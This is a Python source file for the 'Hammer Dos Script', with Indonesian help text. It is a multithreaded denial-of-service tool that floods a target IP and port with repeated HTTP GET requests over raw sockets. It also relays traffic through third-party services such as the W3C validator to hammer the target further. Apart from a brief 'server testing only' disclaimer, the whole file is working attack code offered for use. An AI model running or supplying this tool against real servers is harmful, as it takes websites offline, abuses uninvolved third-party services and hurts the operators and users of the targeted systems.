from queue import Queue
from optparse import OptionParser
import time
import sys
import socket
import threading
import logging
import urllib.request
import random
import signal

def user_agent():
    user_agents = [
        "Mozilla/5.0 (compatible; MSIE 9.0; Windows NT)",
        # ... tambahkan user-agent lainnya sesuai kebutuhan
    ]
    return user_agents

def my_bots():
    bots = [
        "http://validator.w3.org/check?uri=",
        # ... tambahkan URL bot lainnya sesuai kebutuhan
    ]
    return bots

def bot_hammering(url):
    try:
        while True:
            req = urllib.request.urlopen(urllib.request.Request(url, headers={'User-Agent': random.choice(user_agent())}))
            print("\033[94mbot is hammering...\033[0m")
            time.sleep(0.1)
    except:
        time.sleep(0.1)

def down_it(item):
    try:
        while True:
            packet = f"GET / HTTP/1.1\nHost: {host}\nUser-Agent: {random.choice(user_agent())}\n{data}".encode()
            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            s.connect((host, int(port)))
            if s.sendto(packet, (host, int(port))):
                s.shutdown(1)
                print("\033[92m", time.ctime(time.time()), "packet sent!\033[0m")
            else:
                s.shutdown(1)
                print("\033[91mshut<->down\033[0m")
            time.sleep(0.1)
    except socket.error as e:
        print("\033[91mno connection! server may be down\033[0m")
        time.sleep(0.1)

def dos():
    try:
        while True:
            item = q.get()
            down_it(item)
            q.task_done()
    except Exception as e:
        logging.error("Error in dos(): %s", e)

def dos2():
    while True:
        item = w.get()
        bot_hammering(random.choice(my_bots()) + "http://" + host)
        w.task_done()

def usage():
    print('''
    \033[92mHammer Dos Script v.1
    Tanggung jawab akhir pengguna untuk mematuhi semua hukum yang berlaku.
    Ini hanya untuk pengujian server. IP Anda terlihat. 
    penggunaan: python3 hammer.py [-s] [-p] [-t]
    -h : bantuan
    -s : server ip
    -p : port default 80
    -t : turbo default 135\033[0m''')
    sys.exit()

def get_parameters():
    global host
    global port
    global thr
    global item
    optp = OptionParser(add_help_option=False, epilog="Hitting the server with a large number of requests can cause server performance issues or downtime. Use responsibly.")
    optp.add_option("-q", "--quiet", help="set logging to ERROR", action="store_const", dest="loglevel", const=logging.ERROR, default=logging.INFO)
    optp.add_option("-s", "--server", dest="host", help="set server ip")
    optp.add_option("-p", "--port", type="int", dest="port", help="set server port")
    optp.add_option("-t", "--turbo", type="int", dest="turbo", help="set turbo")
    optp.add_option("-h", "--help", dest="help", action='store_true', help="show this help message and exit")
    opts, args = optp.parse_args()
    logging.basicConfig(level=opts.loglevel, format='%(levelname)-8s [%(asctime)s] %(message)s', datefmt='%H:%M:%S')
    if opts.help:
        usage()
    if opts.host is not None:
        host = opts.host
    else:
        usage()
    if opts.port is None:
        port = 80
    else:
        port = opts.port
    if opts.turbo is None:
        thr = 135
    else:
        thr = opts.turbo

# reading headers
global data
headers = open("headers.txt", "r")
data = headers.read()
headers.close()

# task queue are q,w
q = Queue()
w = Queue()

def main():
    try:
        while True:
            for i in range(int(thr)):
                threading.Thread(target=dos, daemon=True).start()
                threading.Thread(target=dos2, daemon=True).start()

            start = time.process_time()

            # tasking
            item = 0
            while True:
                if item > 1800:  # for no memory crash
                    item = 0
                    time.sleep(0.1)
                item += 1
                q.put(item)
                w.put(item)

            # Tidak perlu memanggil down_it(item) di si>

            q.join()
            w.join()
    except KeyboardInterrupt:
        logging.info("Ctrl+C pressed. Exiting gracefully.")
        sys.exit()

if __name__ == '__main__':
    get_parameters()

    # Configure logging
    logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

    logging.info(f"Host: {host}, Port: {port}, Turbo: {thr}")
    logging.info("Please wait...")

    user_agent()
    my_bots()
    time.sleep(5)

    # Register signal handler for Ctrl+C
    signal.signal(signal.SIGINT, lambda signum, frame: sys.exit(0))

    main()

